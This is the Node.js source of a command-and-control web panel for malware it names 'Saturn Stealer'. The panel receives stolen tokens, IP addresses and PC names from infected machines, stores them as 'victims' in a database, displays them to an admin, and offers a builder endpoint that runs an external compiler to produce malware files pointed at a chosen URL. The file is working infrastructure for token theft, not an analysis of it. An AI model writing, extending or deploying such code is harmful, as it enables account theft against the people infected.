
const sqlite3 = require('sqlite3')
const { exec } = require("child_process");
var app = require('express')();
var http = require('http').Server(app);
const bodyParser = require("body-parser")
const frameguard = require('frameguard')
const cookieParser = require('cookie-parser');
const fs = require('fs');


var clients_list = [];

let config_rawdata = fs.readFileSync('config.json');
let config_json = JSON.parse(config_rawdata);
admin_user = config_json["username"];
admin_pass = config_json["password"];

var adminCookie  = strRandom({
    includeUpperCase: true,
    length: 100,
    startsWithLowerCase: true
});

log = `
<style>
body{
    background-color: #2f3136;
    color:white;
    font: 16px Helvetica, Arial;
    cursor: url("/images/cur1054.cur"), pointer;
    background: url("../images/background.jpg");
    

}

.time{
    color:green;
    display:inline;
}
</style>

`

var tempalte_clients = `
<!DOCTYPE html>
<html>
<title>Saturn Stealer - Victimes</title>
<body>

<center>
    <h1>Saturn Stealer - Victimes</h1>
</center>

    %VICTIMES%

    <style>


      body{
          background-color: #2f3136;
          color:white;
          font: 16px Helvetica, Arial;
          cursor: url("/images/cur1054.cur"), pointer;
          background: url("../images/background.jpg");

        }
    
      .information{

        border:1px solid red;
      }

      h1{
          font-size:60px
      }
    </style>
</body>
</html>
`

var template_builder = `
<!DOCTYPE html>
<html>
<title>Saturn Stealer - Success Build</title>
<body>

<br><br><br><br><br><br><br><br><br><br><br><br><br>
    <center>
    <h1>%TEXT%</h1>
    </center>

    <style>


      body{
          background-color: #2f3136;
          color:white;
          font: 12px Helvetica, Arial;
          cursor: url("/images/cur1054.cur"), pointer;
          background: url("../images/background.jpg");

        }
    </style>
</body>
</html>
`

function strRandom(o) {
    var a = 10,
        b = 'abcdefghijklm.opqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
        c = '',
        d = 0,
        e = ''+b;
    if (o) {
      if (o.startsWithLowerCase) {
        c = b[Math.floor(Math.random() * b.length)];
        d = 1;
      }
      if (o.length) {
        a = o.length;
      }
      if (o.includeUpperCase) {
        e += b.toUpperCase();
      }
    }
    for (; d < a; d++) {
      c += e[Math.floor(Math.random() * e.length)];
    }
    return c;
  }

function Setlog(text){
    let ts = Date.now();

    let date_ob = new Date(ts);
    let hour = date_ob.getHours();
    let minutes = date_ob.getMinutes();
    let secondes = date_ob.getSeconds();

    time = "<div class='time'>["+hour+":"+minutes+" - "+secondes+"s"+"]</div> "
    log += (time+text+"<br>")

}



app.use(frameguard({ action: 'SAMEORIGIN' }))
app.use(cookieParser());

const bdd = 'database.db'



let db = new sqlite3.Database(bdd, err => {
    if (err)
        throw err
    
    console.log("[*] Success connected on 'database.db'")
    Setlog("Database was conected");



})


db.run("CREATE TABLE IF NOT EXISTS clients (ip TEXT,token TEXT,session_name,pc_name TEXT)");





app.use(bodyParser.urlencoded({
    extended:true
}));

app.get("/", function(req, res) {
    var token = req.cookies.token;

    if(token == adminCookie){
        Setlog("Admin get / page");
        res.send('<script>window.location.replace("/dashboard");</script>')
    }else{
        Setlog("User get / page");
        res.send('<script>window.location.replace("/login");</script>')
    }

    
    
})

app.get("/log", function(req, res) {
    res.send(log)   
})

app.get("/images/victime.png", function(req, res) {
    res.sendFile(__dirname + '/images/victime.png');    
})

app.get("/images/help.png", function(req, res) {
    res.sendFile(__dirname + '/images/help.png');    
})

app.get("/images/cur1054.cur", function(req, res) {
    res.sendFile(__dirname + '/images/cur1054.cur');    
})

app.get("/images/log.png", function(req, res) {
    res.sendFile(__dirname + '/images/log.png');    
})

app.get("/images/builder.png", function(req, res) {
    res.sendFile(__dirname + '/images/builder.png');    
})

app.get("/images/background.jpg", function(req, res) {
    res.sendFile(__dirname + '/images/background.jpg');    
})

app.get("/builder", function(req, res) {

    var token = req.cookies.token;

    if(token == adminCookie){
        Setlog("Admin get /builder page");
        res.sendFile(__dirname + '/files_html/builder.html');
    }else{
        Setlog("User get /builder page");
        res.send('<script>window.location.replace("/login");</script>')
    }
})


app.get("/help", function(req, res) {

    var token = req.cookies.token;

    if(token == adminCookie){
        Setlog("Admin get /help page");
        res.sendFile(__dirname + '/files_html/help.html');
    }else{
        Setlog("User get /help page");
        res.send('<script>window.location.replace("/login");</script>')
    }
})



app.post("/build", function(req, res) {

    var token = req.cookies.token;

    if(token == adminCookie){
        var url = req.body.url.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
        var name = req.body.name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    
        exec("SaturnCompiler.exe "+url+" "+name)
    
        Setlog("Admin post /build url="+url+" name="+name);
        
        res.send(template_builder.replace("%TEXT%","✔️"+__dirname + '/compiled_malware/'+name));
    }else{
        Setlog("Admin post /build url="+url+" name="+name);
        res.send("Error.")
    }
    




        
})

app.get("/login", function(req, res) {



    var token = req.cookies.token;
    
    if(token == adminCookie){
        Setlog("Admin get /login page");
        res.send('<script>window.location.replace("/dashboard");</script>')
    }else{
        Setlog("User get /login page");
        res.sendFile(__dirname + '/files_html/login.html');
    }

    

})

app.get("/dashboard", function(req, res) {

    var token = req.cookies.token;

    if(token == adminCookie){
        res.sendFile(__dirname + '/files_html/dashboard.html');
        Setlog("Admin get /dashboard page");
    }else{
        Setlog("User get /dashboard page");
        res.send('<script>window.location.replace("/login");</script>')
    }

})

app.get("/clients", function(req, res) {

    var token = req.cookies.token;
   
    

    if(token == adminCookie){
        Setlog("Admin get /clients page");
        
        var i = 0
        db.all('SELECT * FROM clients', (err,data) =>{
            if(err)
                throw err

     
            
            list = JSON.stringify(data).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;').replace(/,/g, '<br>').replace(/&quot;/g, '').replace(/{/g, '<br>').replace(/}/g, '').replace(/]/g, '').replace("[", '').replace(/!n/g,"<br>").replace(/token:/g,"");
            
            
            res.send(tempalte_clients.replace("%VICTIMES%","<div class='information'>"+list+"</div>"))
        })
 

    } else{
        Setlog("User get /clients page");
        res.send('<script>window.location.replace("/login");</script>')
    }

})


app.post("/", function(req, res) {
    
    try{
        var token = req.body.token;
        var client_ip = req.body.adresse;
        var session_name = req.body.session_name;
        var pc_name = req.body.pc_name;
    
        db.run('INSERT INTO clients(ip,token,session_name,pc_name) VALUES(?,?,?,?)',[client_ip,token,session_name,pc_name]);
        Setlog("New victim");

    }catch{
        console.log("Invalid Data !")
        Setlog("Incorrect victime data");
        
    }

})

app.post("/login", function(req, res) {
    try{
        var user = req.body.user;
        var pass = req.body.pass;

        if(user == admin_user && pass == admin_pass){
            Setlog("New admin connexion");
            res.cookie('token',adminCookie, { maxAge: 90000000, httpOnly: true });
            res.send('<script>window.location.replace("/dashboard");</script>')
            

        }else{
            protectuser = user.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;')
            protectpass = pass.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;')
            Setlog("User try incorect login: user="+protectuser+" password="+protectpass);
            res.end("Incorect User or Password")

        }


    }catch{

    }

})

http.listen(80, function() {
    Setlog("Start http server");
    console.log("[*] Server is online on port 80")
})